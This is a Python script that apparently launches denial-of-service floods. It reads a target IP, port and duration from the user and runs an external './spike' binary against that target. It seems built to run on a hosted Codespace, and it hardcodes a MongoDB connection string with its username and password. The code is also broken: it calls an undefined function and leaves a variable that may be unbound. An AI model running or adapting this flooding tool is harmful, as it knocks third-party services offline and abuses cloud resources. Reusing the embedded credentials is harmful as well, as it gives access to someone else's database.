import os
import json
import logging
import asyncio
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from threading import Thread

# Initialize event loop
loop = asyncio.get_event_loop()

# MongoDB Configuration
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Constants
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
REMOTE_HOST = '4.213.71.147'

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./spike {target_ip} {target_port} {duration} 60"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            print(f"Command output: {output}")
        if error:
            print(f"Command error: {error}")

    except Exception as e:
        print(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def process_attack_command(target_ip, target_port, duration):
    if target_port in blocked_ports:
        print(f"Port {target_port} is blocked. Please use a different port.")
        return

    asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
    print(f"✧ Attack started ✧\n\n✧ Host: {target_ip}\n✧ Port: {target_port}\n✧ Time: {duration} seconds")

def main():
    while True:
        print("Enter attack command in the format: target_ip target_port duration")
        user_input = input().strip().split()
        
        if len(user_input) != 3:
            print("Invalid command format. Please use: target_ip target_port duration")
            continue
        
        target_ip, target_port, duration = user_input[0], int(user_input[1]), user_input[2]
        
        process_attack_command(target_ip, target_port, duration)

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    print("Starting Codespace activity keeper...")
    main()
